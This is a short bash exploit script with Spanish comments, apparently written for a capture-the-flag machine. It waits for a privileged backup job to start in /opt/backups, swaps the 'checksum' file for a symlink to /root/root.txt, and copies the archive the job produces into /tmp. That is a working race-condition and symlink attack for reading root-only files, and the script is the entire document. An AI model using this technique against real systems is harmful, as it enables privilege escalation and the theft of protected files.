TARGET="/root/root.txt"; BACK="/opt/backups"; OUT="/var/backups/web_backups"; TMP="/tmp";
echo "[*] watcher: esperando primer tar en $BACK";
while true; do
  # detectar primer tar creado por el primer tar -cvf
  tarfile=$(ls -1 "${BACK}" 2>/dev/null | grep -E '^[0-9]+\.tar$' | head -n1)
  if [ -n "$tarfile" ]; then
    echo "[*] watcher: detectado $tarfile"
    # eliminar checksum si existe y crear symlink hacia TARGET
    rm -f "${BACK}/checksum" 2>/dev/null
    ln -sf "${TARGET}" "${BACK}/checksum" && echo "[*] watcher: symlink creado -> ${TARGET}"
    # esperar un poco a que el segundo tar se ejecute y cree el tar final
    sleep 6
    # buscar el tar final más reciente en OUT y copiarlo a /tmp
    newtar=$(ls -1 "${OUT}" 2>/dev/null | grep -E '^[0-9]+\.tar$' | tail -n1)
    if [ -n "$newtar" ]; then
      echo "[*] watcher: encontrado tar final ${OUT}/${newtar} ; intentando copiar a ${TMP}"
      cp "${OUT}/${newtar}" "${TMP}/" 2>/dev/null && echo "[*] watcher: copiado a ${TMP}/${newtar}" || echo "[!] watcher: no se pudo copiar"
      break
    else
      echo "[!] watcher: no encontré tar final, esperar un poco más"
      sleep 2
    fi
  fi
  # polling rápido
  sleep 0.15
done
echo "[*] watcher terminado"
